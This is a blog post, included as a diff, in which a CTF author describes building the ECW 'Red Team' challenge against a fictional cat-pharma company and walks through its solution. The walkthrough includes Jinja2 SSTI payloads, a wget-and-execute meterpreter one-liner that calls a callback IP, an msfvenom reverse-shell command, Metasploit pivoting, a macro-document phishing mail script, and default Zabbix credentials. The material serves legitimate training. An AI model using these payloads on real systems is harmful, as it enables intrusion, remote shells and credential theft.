@@ -1,0 +1,628 @@
+I"|�<h1 id="red-team">Red Team</h1>
+
+<h2 id="table-of-contents">Table of Contents</h2>
+<ol>
+  <li><a href="#intro">Intro</a></li>
+  <li><a href="#the-initial-idea">The initial idea</a></li>
+  <li><a href="#creation-of-each-step">Creation of each step</a>
+    <ul>
+      <li><a href="#osint">OSINT</a></li>
+      <li><a href="#web-application-pentest">Web Application Pentest</a></li>
+      <li><a href="#phishing">Phishing</a></li>
+      <li><a href="#ad-compromise">AD Compromise</a></li>
+      <li><a href="#infrastucture">Infrastucture</a></li>
+    </ul>
+  </li>
+  <li><a href="#write-up-solution">Write up (Solution)</a>
+    <ul>
+      <li><a href="#description">Description</a></li>
+      <li><a href="#step-1---osint">Step 1 - OSINT</a>
+        <table style="margin: 0; width: 100%; border: none;">
+    <tr style="border: none; padding: 0">
+       <td style="border: none; padding: 0; width: 33.333%; vertical-align: top;">
+          <ul>
+          <li><a href="#google">Google</a></li>
+          <li><a href="#twitter">Twitter</a></li>
+          <li><a href="#github">GitHub</a></li>
+          <li><a href="#instagram">Instagram</a></li>
+          </ul>
+       </td>
+       <td style="border: none; padding: 0; width: 33.333%; vertical-align: top;">
+          <ul>
+          <li><a href="#google-again">Google again</a></li>
+          <li><a href="#linkedin">LinkedIn</a></li>
+          <li><a href="#the-website">The Website</a></li>
+          <li><a href="#fun-fact-malware-site">Fun Fact: Malware site</a></li>
+          </ul>
+       </td>
+       <td style="border: none; padding: 0; width: 33.333%; vertical-align: top;">
+          <ul>
+          <li><a href="#fun-fact-collateral-damage">Fun Fact: Collateral damage</a></li>
+          <li><a href="#this-hint-noone-found">This Hint noone found</a></li>
+          </ul>
+       </td>
+    </tr>
+ </table>
+      </li>
+      <li><a href="#step-2---web-application-pentest">Step 2 - Web Application Pentest</a>
+        <ul>
+          <li><a href="#intended-way-weak-acl">Intended way: Weak ACL</a></li>
+          <li><a href="#unintended-way-cookie-flask-with-weak-secret">Unintended way: Cookie Flask with weak secret</a></li>
+          <li><a href="#fun-fact-pranksters">Fun Fact: Pranksters</a></li>
+          <li><a href="#ssti">SSTI</a></li>
+        </ul>
+      </li>
+      <li><a href="#step-3---phishing-some-hr">Step 3 - Phishing some HR</a>
+        <ul>
+          <li><a href="#pivot-with-the-web-app">Pivot with the Web App</a></li>
+          <li><a href="#fun-fact-database-under-presure">Fun Fact: Database under pressure</a></li>
+          <li><a href="#phishing-click-master">Phishing Click Master</a></li>
+          <li><a href="#fun-fact-funny-emails-received">Fun Fact: Funny emails received</a></li>
+        </ul>
+      </li>
+      <li><a href="#step-4---ciso-here-i-come">Step 4 - CISO here I come</a>
+        <ul>
+          <li><a href="#recon-on-hr">Recon on HR</a></li>
+          <li><a href="#fun-fact-where-is-the-lpe">Fun Fact: Where is the LPE</a></li>
+          <li><a href="#zabbix">Zabbix</a></li>
+          <li><a href="#fun-fact-omg-windef">Fun Fact: OMG WinDef</a></li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li><a href="#conclusion">Conclusion</a></li>
+</ol>
+
+<h2 id="intro">Intro</h2>
+
+<p>For the European Cyber Week Challenge (ECW Challenge), I’ve created a challenge named Red Team divided in 4 steps. This blog post aims to present how this challenge was created and the purpose of each step of it. Also a write up on the solution will be presented at the end of the article with some fun facts that occured during the challenge.</p>
+
+<h2 id="the-initial-idea">The initial idea</h2>
+
+<p>I wanted to create a challenge which simulates a realistic situation that one can find in a Red Team operation. The initial goal of the challenge was to fully compromise a company (ie. get domain administrator privileges as the ultimate goal). To create the scenario I used different real world situations that I have encountered during different audits.
+I divided my challenge in 4 steps:</p>
+<ul>
+  <li>OSINT based on keywords to find out the entry point;</li>
+  <li>Web application pentest to reach an internal mail server requiring no authentication;</li>
+  <li>Phishing on the company to get foothold in the information system;</li>
+  <li>AD compromise (yet with no precise idea of how to).</li>
+</ul>
+
+<p>However, since there was a risk that a challenger could break the challenge if we let him reach Domain Administrator privileges, I decided to never give these privileges on compromised systems. So the last step of the challenge was to retrieve the NT hash of the a target character.
+Now that the schema of the challenge was done, I needed to think about “how to build each step”.</p>
+
+<h2 id="creation-of-each-step">Creation of each step</h2>
+
+<h3 id="osint">OSINT</h3>
+
+<p>As previously said, I wanted to create an OSINT part to make the challengers find out the website to attack. However I didn’t want to do a guessing challenge like one can find in other CTF with this type of challenge. I wanted to create a straight forward challenge. The aim is to create a nice and funny universe, where challengers should not be frustrated to have to guess something.
+First I wanted to use popular social medias:</p>
+<ul>
+  <li>Twitter (Eveyone in IT uses twitter)</li>
+  <li>Github (One often finds interesting things in commits)</li>
+  <li>Instagram (Who does not like taking picture of self with company information in the background?)</li>
+  <li>Linkedin (Every company uses it, it was the natural last social link to find out the website)</li>
+</ul>
+
+<p>Now that I had the path for my scenario, I needed to create a context. Since this year’s very very original ECW theme was medical (covid), I needed to create something related. As I am also a big cat-lover, I imagined a company which creates medication for cats named <em>PharmaHealthyCat</em>. And to match the covid theme, it creates Covid vaccines for cats. \o/ I got my company.
+Now I needed to find the target, the one who likes social media. I needed to find a face which challenger would directly find out that is not a real person. So I took the meme Harold.</p>
+
+<p><img src="/assets/redteam/harold.jpg" alt="Feel The pain" />
+Thanks to the Internet, I could find many images of him in different situations and clothes.</p>
+
+<p>I got everything and started created the different accounts on the different social medias and I make them to have a little activities:</p>
+<ul>
+  <li>Twitter: Tweet the github on first tweet, then create tweets and retweets so stupid stuff;</li>
+  <li>Github: Fork multiple projets. Find a project to use Instagram. Fork it and create a config file with the Instagram account;</li>
+  <li>Instagram: Post pictures of Harold and cats of course. Create a post with a picture including an open Word document with the company name. I needed to take the picture myself, so I asked someone to take me in picture in front of my computer.</li>
+  <li>Linkedin: Create multiple accounts for employees, create the company page with the link to the website.</li>
+</ul>
+
+<p>The purpose of this step was to show that even if people has nothing to hide, social medias can leak a lot of usefull data for an attacker.</p>
+
+<p>Ok now, the first step is done.</p>
+
+<h3 id="web-application-pentest">Web Application Pentest</h3>
+
+<p>For this step, I needed to think about which vulnerability I wanted to use to create remote code execution. I thought about Server Side Template Injection (SSTI) as an attack vector. But I didn’t want to make the feature reachable from an unauthenticated user nor a basic user. So I decided to add a vulnerability to escalate privileges on the application. The privilege escalation was supposed to be from a weak access control on the user maangement page (the page was not directly linked on the site and needed to be discovered by the challengers) and the feature which allows to change users’ privileges.
+But since, I am a lazy developper, I didn’t change the key used to sign the session cookie of the Flask application. Therefore an other way to escalate privileges was to craft a cookie with ID 1 (existing admin account) and sign it with the default key wich is … <em>key</em>.
+On the website, I needed to introduce the company, put employees pictures and ultimately put a hint which indicates next step is to perform spear phishing against an employee. Who else better than the Human Ressources director for a target?</p>
+
+<p>The purpose of this step was to reach the internal SMTP server.</p>
+
+<h3 id="phishing">Phishing</h3>
+
+<p>For this step, multiple things were needed:</p>
+<ul>
+  <li>SMTP server to send emails;</li>
+  <li>IMAP/POP3 server to receive emails;</li>
+  <li>An Active Directory environment for the company;</li>
+  <li>A workstation with a script opening emails and their attachments.</li>
+</ul>
+
+<p>At the beginning, I wanted to simulate a real world situation, so I wanted to put on the workstation an antivirus (default Windows Defender is good enough). And ultimately configuring a Firewall to prevent callbacks on ports other than 80/tcp and 443/tcp.<br />
+But since I knew that a lot of challengers would not find out spear phishing is needed to be performed for this step, I decided to remove firewall and antivirus. I know, I am a nice person =D.</p>
+
+<p>The purposes of this step were:</p>
+<ul>
+  <li>Pivoting on the network from the web application server to reach internal services;</li>
+  <li>Think to use SMTP server/relay in companies which can be found lacking authentication (oops);</li>
+  <li>Trust company employees to click on everything they receive via email.</li>
+</ul>
+
+<h3 id="ad-compromise">AD Compromise</h3>
+
+<p>For this step, I didn’t know what to do to compromise the Active Directory. But I was pretty sure about something: I am lazy guy.
+So I decided to use Zabbix as a supervision solution. Companies often have stuff like this to monitor their information systems. They even often activate remote commands (read “remote code execution”) to perform custom tasks and checks on workstations and servers (by default Zabbix disables it).
+I needed to create a Linux server to host the Zabbix application. I also needed to install Zabbix agents on the workstation and enable remote commands on the final target’s workstation. I didn’t activate this feature on the HR workstation because, as it ran with SYSTEM privileges, I did not want challengers to abuse it to privesc (to perform mimikatz on it).
+I set up the agent to run as our target user to get his privileges when remote code execution is performed on his workstation.</p>
+
+<p>I asked challengers to retrieve the NT hash to validate the challenge. However the question was “How do you get the NT hash when you have remote code execution within your target context?”.
+The solution was to catch a NTLMv2 hash and crack it with a wordlist (RockYou), as it was made from a weak password, and finally craft the NT hash from the plain text password.
+The Zabbix application was running with default credentials to access the remote commands feature. I also left the .msi installer used to install the agent on the Downloads folder of the HR machine to give a hint for challengers. They could then read the configuration file of the Zabbix agent to discover the Zabbix server IP address.</p>
+
+<p>The purposes of this step were:</p>
+<ul>
+  <li>Pivot can be performed through supervision tools (do not focus on classic Active Directory attacks);</li>
+  <li>Company often keep using default credentials for internal (critical) applications;</li>
+  <li>Services often run elevated, as SYSTEM of with domain administrator privileges (even if on this scenario it was not the case);</li>
+  <li>Understand that gaining elevated privileges or using Responder to target users was not needed here since we have already have code execution in a domain user context through the monitoring agent;</li>
+  <li>Weak passwords are still used in companies;</li>
+  <li>Know the difference between NT, NTLM and NetNTLMv2 hash formats.</li>
+</ul>
+
+<h3 id="infrastucture">Infrastucture</h3>
+
+<p>For this challenge we used an ESXi to host our different virtual machines. This challenge required several VMs:</p>
+<ul>
+  <li>1 firewall (pfSense) to separate the different networks and allow only necessary flows between networks;</li>
+  <li>1 Linux server to host docker containers needed for the web application, its database and the mail server (we later added a SSO reverse-proxy to filter access to only challengers);</li>
+  <li>1 Linux server to host Zabbix application;</li>
+  <li>2 Windows workstations (HR and Harold);</li>
+  <li>1 Domain Controller.</li>
+</ul>
+
+<p>I created 3 networks (VLANs) for this challenge:</p>
+<ul>
+  <li>A DMZ to host the Web application, database and mailer;</li>
+  <li>A LAN containing users workstations;</li>
+  <li>A Tier0 for “critical” servers (Zabbix server and Domain Controller)</li>
+</ul>
+
+<p><img src="/assets/redteam/schema.png" alt="Schema" /></p>
+
+<h2 id="write-up-solution">Write up (Solution)</h2>
+
+<h3 id="description">Description</h3>
+
+<p>When we first connect on the challenge we read this message to introduce the challenge:</p>
+
+<blockquote>
+  <p>The CSO of a famous company is looking for skilled hackers to join his team.</p>
+
+  <p>He sent the following challenge:</p>
+
+  <p>I setup a website to challenge your skill as a pentester<br />
+Find me over the Internet as I stand by the nickname <code class="language-plaintext highlighter-rouge">Zer0DayH4ckz0r</code><br />
+If you reach my website you should be able to gain control of a server<br />
+You will then need to go deeper and find a pivot<br />
+Finally if your are good enough you will send me my own password as a NTLM hash<br /><br /></p>
+
+  <p>Good luck!</p>
+</blockquote>
+
+<h3 id="step-1---osint">Step 1 - OSINT</h3>
+
+<h4 id="google">Google</h4>
+
+<p>Fist step of the challenge was to type <code class="language-plaintext highlighter-rouge">Zer0DayH4ckz0r</code> on our favorite search engine:</p>
+
+<p><img src="/assets/redteam/google.png" alt="Google" /></p>
+
+<p>We find a twitter account which seems to correspond to the nickname.</p>
+
+<h4 id="twitter">Twitter</h4>
+
+<p>We scroll until we find out a tweet which brings a Github account:</p>
+
+<p><img src="/assets/redteam/twitter.png" alt="Twitter" /></p>
+
+<h3 id="github">GitHub</h3>
+
+<p>On the Github activity, we can find out that he contributed on 1 project “instagram-terminal-news-feed”:</p>
+
+<p><img src="/assets/redteam/github.png" alt="Github" /></p>
+
+<p>On the project we look at his commits:</p>
+
+<p><img src="/assets/redteam/commit.png" alt="commits" /></p>
+
+<p>Here we find the commit “Oops, removed credentials from repo”. We look at it:</p>
+
+<p><img src="/assets/redteam/insta.png" alt="insta" /></p>
+
+<p>And we obtain 2 informations:</p>
+<ul>
+  <li>his instagram account;</li>
+  <li>his instagram password.</li>
+</ul>
+
+<h4 id="instagram">Instagram</h4>
+
+<p>We attempt to connect on instagram using his credentials … unsuccessfully. However the instagram account actually exists so we will take a look at its content.
+We find the face for our target, the famous Harold.</p>
+
+<p><img src="/assets/redteam/instagram.png" alt="instagram account" /></p>
+
+<p>We look at the pictures posted on the social media … to eventually find an interesting picture:</p>
+
+<p><img src="/assets/redteam/image.png" alt="Interesting image" /></p>
+
+<p>On the picture found on the Instagram we can read on a part of the screen <code class="language-plaintext highlighter-rouge">Compte Rendu S...</code> and <code class="language-plaintext highlighter-rouge">PharmaHealthyCat</code>. OK, It smells better than a website which distributes malwares* so let’s google it.</p>
+
+<h4 id="google-again">Google again</h4>
+
+<p><img src="/assets/redteam/google2.png" alt="Google" /></p>
+
+<h4 id="linkedin">LinkedIn</h4>
+
+<p>We find linkedin account related to this company name. Let’s take a look the Linkedin pages. By looking at one of this profile, we find a company page named <code class="language-plaintext highlighter-rouge">PharmaHealthyCat</code> just like in the Instagram image.</p>
+
+<p><img src="/assets/redteam/linkedin.png" alt="Linkedin" /></p>
+
+<p>On the company page, we can find a website [https://phealthycat.org] and our target (Harold) whose name is <code class="language-plaintext highlighter-rouge">Jean Luc Delafont</code>.</p>
+
+<p><img src="/assets/redteam/phealthy.png" alt="Linkedin" /></p>
+
+<h4 id="the-website">The Website</h4>
+
+<p>When accessing the web site, we have a short presentation of the company. We also get a piece of information that we will be needed later: the email address of the HR Lucie Bayard <code class="language-plaintext highlighter-rouge">lucie.bayard@phealthycat.org</code></p>
+
+<p><img src="/assets/redteam/endosint.png" alt="Front page" />
+<img src="/assets/redteam/flag1.png" alt="flag 1" />
+By browsing the <code class="language-plaintext highlighter-rouge">Blog</code>, we can find the flag in base64: <code class="language-plaintext highlighter-rouge">ECW{N1ckN4me_1s_G0Od_If_Y0u_D0n't_Thr0w}</code>.</p>
+
+<h4 id="fun-fact-malware-site">Fun Fact: Malware site</h4>
+
+<p>Here some challengers looked at profiles of the users who liked the image.</p>
+
+<p><img src="/assets/redteam/like.png" alt="like" /></p>
+
+<p>And by looking at the user <code class="language-plaintext highlighter-rouge">piratemonster1337</code>. We find a website <code class="language-plaintext highlighter-rouge">monster.casa</code> which allows users to download a malware. Some challengers attempted to scan the website in order to find vulnerabilities and some others attempted to reverse the malware thinking it was part of the challenger. 
+This website appeared to have been DOS by some challengers due to the scans performed. RIP unknown man.</p>
+
+<h4 id="fun-fact-collateral-damage">Fun Fact: Collateral damage</h4>
+
+<p>Other challengers went a little offroad on Twitter users following our fake account and less malicious sites may have met a similar end …</p>
+
+<p><img src="/assets/redteam/slipped.jpeg" alt="slipped" /></p>
+
+<p><img src="/assets/redteam/oops.jpeg" alt="oops" /></p>
+
+<p>When admins got aware of this information, a Discord message was sent to tell challengers that if they don’t find a flag on the website, it was probably the wrong one.</p>
+
+<p><img src="/assets/redteam/admincall.png" alt="Admin call" /></p>
+
+<h4 id="this-hint-noone-found">This Hint noone found</h4>
+
+<p>During the tests of the challenge our tester told us the DNS entries for <code class="language-plaintext highlighter-rouge">phealthycat.org</code> pointed the mailer to our hosting provider (OVH). We then decided to configure the MX entry to point an internal IP address to give a hint where [not] to go next.</p>
+
+<p><img src="/assets/redteam/robtex.png" alt="Robtex mailer.phealthycat.org" /></p>
+
+<h3 id="step-2---web-application-pentest">Step 2 - Web Application Pentest</h3>
+
+<p>The application allows users to create an account. For this Write-up, we will create an account named <code class="language-plaintext highlighter-rouge">writeup</code>. <br />
+Once connected with our account, we have two solution to escalate our privileges:</p>
+<ul>
+  <li>Break the Flask cookie and craft a new one with an other ID which is admin;</li>
+  <li>Find the ACL flaw to become admin.</li>
+</ul>
+
+<h4 id="intended-way-weak-acl">Intended way: Weak ACL</h4>
+
+<p>The intended way was to access the endpoint <code class="language-plaintext highlighter-rouge">/home/users</code>. With a little directory discovery, we can easily find this endpoint.
+On this page, we can see the list of all users with a “disabled” button <code class="language-plaintext highlighter-rouge">Change Privileges</code>. We look for our user and click on the button after removing the HTML attribute <code class="language-plaintext highlighter-rouge">disabled</code>.</p>
+
+<p><img src="/assets/redteam/users.png" alt="Users" /></p>
+
+<p>We are now admin and have access to new features. Particulary the feature <code class="language-plaintext highlighter-rouge">Template builder</code>. Smell the SSTI here.</p>
+
+<h4 id="unintended-way-cookie-flask-with-weak-secret">Unintended way: Cookie Flask with weak secret</h4>
+
+<p>An other possibity was to break the flask cookie due to a weak secret key (<code class="language-plaintext highlighter-rouge">key</code>). OOPS. With that secret, we can change and reforge our cookie and take the ID of an admin user.</p>
+
+<h4 id="fun-fact-pranksters">Fun Fact: Pranksters</h4>
+
+<p>A challenger sent me a DM on Discord, wondering if his method was intended. He sent with his real email address an email to Lucie Bayard, and became admin. Unfortunantly for him, an other challenger put him admin. Therefore he thought that was the solution until someone rolled-back his privileges. RIP.</p>
+
+<p><img src="/assets/redteam/privesclol.png" alt="LOL" /></p>
+
+<h4 id="ssti">SSTI</h4>
+
+<p>Now that we can access the template feature, we can perform some remote code execution. 
+<img src="/assets/redteam/template.png" alt="ssti" /></p>
+
+<p>Here again there were two ways:</p>
+<ul>
+  <li>Easy way: use <code class="language-plaintext highlighter-rouge">TemplateReference</code> object to call the <code class="language-plaintext highlighter-rouge">os.system</code>;
+The payload using TemplateReference:<br />
+<!--  -->
+<code class="language-plaintext highlighter-rouge">{{ self._TemplateReference__context.cycler.__init__.__globals__.os.system("CMD") }}</code>
+<!--  --></li>
+  <li>Hard way: use object introspection to find <code class="language-plaintext highlighter-rouge">subprocess.popen</code> method.
+For the hard way, we enumerate the subclasses to find the <code class="language-plaintext highlighter-rouge">subprocess.popen</code> method.</li>
+</ul>
+
+<p><img src="/assets/redteam/SSTIIntend.png" alt="ssti" />
+<img src="/assets/redteam/SSTIIntend2.png" alt="ssti" /></p>
+
+<p>We sort all the classes and method to find the offset of our method. It appears to be the offset <code class="language-plaintext highlighter-rouge">418 - 1</code> (array start at 0).
+<!--  -->
+Therefore by calling <code class="language-plaintext highlighter-rouge">{{ ().__class__.__bases__[0].__subclasses__()[417]("CMD") }}</code> we obtain the popen method to perform arbitrary command.
+<!--  -->
+Now that we have a RCE on the application, we now want a shell. For that, we’ll make the application to download a meterpreter and execute it.</p>
+
+<p>The payload will be: <code class="language-plaintext highlighter-rouge">cd /tmp &amp;&amp; wget http://&lt;CALLBACK_IP&gt;/meter.elf &amp;&amp; chmod +x /tmp/meter.elf &amp;&amp; /tmp/meter.elf</code>.</p>
+
+<p>To craft the meterpreter I used: <code class="language-plaintext highlighter-rouge">msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -a x64 LHOST=&lt;CALLBACK_IP&gt; LPORT=PORT &gt; meter.elf</code></p>
+
+<p><img src="/assets/redteam/meterpreter.png" alt="meterpreter" />
+<img src="/assets/redteam/meterpreterCallBack.png" alt="meterpreter callback" />
+Now we can navigate to <code class="language-plaintext highlighter-rouge">/app</code> to retrieve the flag <code class="language-plaintext highlighter-rouge">ECW{EaSy_P4rt_D0ne_C0ngratz}</code>.
+<img src="/assets/redteam/flag2.png" alt="flag2" /></p>
+
+<h3 id="step-3---phishing-some-hr">Step 3 - Phishing some HR</h3>
+
+<h4 id="pivot-with-the-web-app">Pivot with the web app</h4>
+
+<p>Now we have a shell on the application, we now have to find out what to do. After some enumeration, we realise we are in a docker container (<code class="language-plaintext highlighter-rouge">/.dockerenv</code>) and that we can’t privesc on the machine. So we will perform a network scan using ping.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for i in `seq 1 100`; do ping -c 1 -w 1 172.19.0.$i;done
+</code></pre></div></div>
+<p><img src="/assets/redteam/pingScan.png" alt="pingScan" />
+We observe the following IP addresses:</p>
+<ul>
+  <li>172.19.0.1 (We assume that is the docker gateway);</li>
+  <li>172.19.0.2 (We are here);</li>
+  <li>172.19.0.3;</li>
+  <li>172.19.0.4.</li>
+</ul>
+
+<p>To perform port scan, we will setup proxychains to be able to use <code class="language-plaintext highlighter-rouge">netcat</code>. For that we used the metasploit modules:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">multi/manage/autoroute</code>;</li>
+  <li><code class="language-plaintext highlighter-rouge">server/socks_proxy</code>.
+<img src="/assets/redteam/autoroute.png" alt="autoroute" />
+<img src="/assets/redteam/socks.png" alt="socks" /></li>
+</ul>
+
+<p>And then we will use <code class="language-plaintext highlighter-rouge">echo</code>, <code class="language-plaintext highlighter-rouge">netcat</code> and <code class="language-plaintext highlighter-rouge">proxychains</code> to scan each machine. We will only select some classic ports:</p>
+<ul>
+  <li>21 (FTP)</li>
+  <li>22 (SSH)</li>
+  <li>25 (SMTP)</li>
+  <li>80 (HTTP)</li>
+  <li>443 (HTTPS)</li>
+  <li>445 (SMB)</li>
+  <li>3306 (MySQL)</li>
+  <li>5900 (VNC)</li>
+</ul>
+
+<p><img src="/assets/redteam/nmap1.png" alt="nmap machine 1" />
+On the machine 172.19.0.3, we have found the port 3306 opened. We can assume that it is the database of the web application.</p>
+
+<p>If we scan the second machine:
+<img src="/assets/redteam/nmap2.png" alt="nmap machine 2" />
+We can find a SMTP port open. If we remember the Part1 of the challenge, it was said “Send your resume to Lucie Bayard”. <br />
+So we need to perform some spear phishing on Lucie Bayard.</p>
+
+<h4 id="fun-fact-database-under-presure">Fun Fact: Database under presure</h4>
+
+<p>For a lot of challengers, the database was <strong>the man to kill</strong>.</p>
+
+<p>I received multiple DM on discord if it was normal if their attacks didn’t work.</p>
+
+<blockquote>
+  <p>Hello une petite question, normal que ça marche pas ça ? Quand j’essaye chez moi (a gauche) j’arrive bien à lire le fichier
+<img src="/assets/redteam/DB1_Screen.png" alt="DB1" /></p>
+</blockquote>
+
+<blockquote>
+  <p>hello, normal aussi que je puisse pas faire ca ?
+<img src="/assets/redteam/DB2_Screen.png" alt="DB2" />
+parce que ce doc avait quand même l’air d’être au petits oignions https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf</p>
+</blockquote>
+
+<p>People attacked so much the database that I wanted to rename it to “yamete kudasai”.</p>
+
+<p><img src="/assets/redteam/yamete.png" alt="yamete" /></p>
+
+<h4 id="phishing-click-master">Phishing click master</h4>
+
+<p>As the challenge description informs us we are looking for a NTLM hash, we will assume we target a Windows workstation.</p>
+
+<p>Then, we will create a docm using metasploit</p>
+
+<p><img src="/assets/redteam/MacroMeter.png" alt="Macro" /></p>
+
+<p>And we will use the first script we find on a random github (https://gist.github.com/boina-n/e43b996fa0f520c918e3ed6beb754447) to sent it:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nv">filename</span><span class="o">=</span><span class="s2">"/tmp/msf.docm"</span>
+<span class="nv">subject</span><span class="o">=</span><span class="s2">"Subject of my email"</span>
+<span class="nv">txtmessage</span><span class="o">=</span><span class="s2">"This is the message I want to send"</span>
+
+<span class="o">{</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">"EHLO phealthycat.org"</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">"MAIL FROM: &lt;test@phealthycat.org&gt;"</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">"RCPT TO: &lt;lucie.bayard@phealthycat.org&gt;"</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">"DATA"</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">"Subject:"</span> <span class="nv">$subject</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">"Content-Type: multipart/mixed; boundary="</span>KkK170891tpbkKk__FV_KKKkkkjjwq<span class="s2">""</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">""</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">"This is a MIME formatted message.  If you see this text it means that your"</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">"email software does not support MIME formatted messages."</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">""</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">"--KkK170891tpbkKk__FV_KKKkkkjjwq"</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">"Content-Type: text/plain; charset=UTF-8; format=flowed"</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">"Content-Disposition: inline"</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">""</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="nv">$txtmessage</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">""</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">""</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">"--KkK170891tpbkKk__FV_KKKkkkjjwq"</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">"Content-Type: file --mime-type -b filename-</span><span class="si">$(</span><span class="nb">date</span> +%y%m%d<span class="si">)</span><span class="s2">.zip; name=filename-</span><span class="si">$(</span><span class="nb">date</span> +%y%m%d<span class="si">)</span><span class="s2">.docm"</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">"Content-Transfer-Encoding: base64"</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">"Content-Disposition: attachment; filename="</span>filename-<span class="si">$(</span><span class="nb">date</span> +%y%m%d<span class="si">)</span>.docm<span class="s2">";"</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">""</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="c"># The content is encoded in base64.</span>
+<span class="nb">cat</span> <span class="nv">$filename</span> | <span class="nb">base64</span><span class="p">;</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">""</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">""</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">"--KkK170891tpbkKk__FV_KKKkkkjjwq--"</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">""</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">"."</span>
+<span class="nb">sleep </span>1<span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">"quit"</span>
+<span class="o">}</span> | proxychains nc 172.19.0.4 25
+</code></pre></div></div>
+
+<p>Once the mail is sent thanks to our superb script, we just have to wait for the callback.</p>
+
+<p><img src="/assets/redteam/meterpreter2.png" alt="Meterpreter HR" /></p>
+
+<p>Now that we have a shell on the HR, we can grab the flag on the Desktop: <code class="language-plaintext highlighter-rouge">ECW{Hum4n_1s_Th3_W3akest_P0int}</code>.</p>
+
+<p><img src="/assets/redteam/flag3.png" alt="flag 3" /></p>
+
+<h4 id="fun-fact-funny-emails-received">Fun Fact: Funny emails received</h4>
+<p>During the challenge, I looked on some emails received by the HR. Some challengers sent various payload with make me laught. Unfortunately I didn’t screen people who sent Linux payloads in the email body. But I could have catch some funny emails.</p>
+
+<p>PHP INFO WTF ? I really don’t know ?</p>
+
+<blockquote>
+  <p><img src="/assets/redteam/phpinfo.png" alt="phpinfo" /></p>
+</blockquote>
+
+<p>This guy is at the end of his life :’)</p>
+
+<blockquote>
+  <p><img src="/assets/redteam/JPP.png" alt="JPP" /></p>
+</blockquote>
+
+<h3 id="step-4---ciso-here-i-come">Step 4 - CISO here I come</h3>
+
+<h4 id="recon-on-hr">Recon on HR</h4>
+
+<p>Once we got a shell, we need to find a way to get to the CISO (Jean Luc Delafont). First we will dig in the home directory of Lucie. By looking in the <code class="language-plaintext highlighter-rouge">Download</code> folder, we can find an interesting file: <code class="language-plaintext highlighter-rouge">zabbix_agent-5.4.4-windows-amd64-openssl.msi</code>.</p>
+
+<p><img src="/assets/redteam/hintDL.png" alt="Hint" /></p>
+
+<p>We can also find an other file <code class="language-plaintext highlighter-rouge">ThisIsNotAHint.jpeg</code>. This file is not usefull for the challenge, he was only here to make challengers to remember good old memories :).</p>
+
+<p><img src="/assets/redteam/ThisIsNotAHint.jpeg" alt="ThisIsNotAHint" />.</p>
+
+<p>Now we know there is something related to Zabbix in this challenge. Let’s check if the agent is installed on the system and if so, we can look at the configuration file.</p>
+
+<p><img src="/assets/redteam/zabbixConf.png" alt="Zabbix Config" /></p>
+
+<p>By looking at the configuration file, we can find the Zabbix server address IP: <code class="language-plaintext highlighter-rouge">192.168.12.234</code></p>
+
+<p><img src="/assets/redteam/ZabbixConf2.png" alt="Zabbix Server IP" /></p>
+
+<h4 id="fun-fact-where-is-the-lpe">Fun Fact: Where is the LPE</h4>
+
+<p>A lot of people tried to escalate their privileges on the HR workstation, however there was no way to do so. Some were so deseperated that they tried some random DLL hijacking.</p>
+
+<blockquote>
+  <p><img src="/assets/redteam/LPE.png" alt="LPE" /></p>
+</blockquote>
+
+<blockquote>
+  <p><img src="/assets/redteam/DLLHijack.png" alt="DLL" /></p>
+</blockquote>
+
+<h4 id="zabbix">Zabbix</h4>
+
+<p>Now that we have the Zabbix server IP, we can attempt to connect on it.<br />
+By accessing the IP through HTTP (http://192.168.12.234), we can successfuly connect to interface using defaut Zabbix credentials:</p>
+<ul>
+  <li>login: Admin</li>
+  <li>password: zabbix</li>
+</ul>
+
+<p><img src="/assets/redteam/zabbix.png" alt="Zabbix" /></p>
+
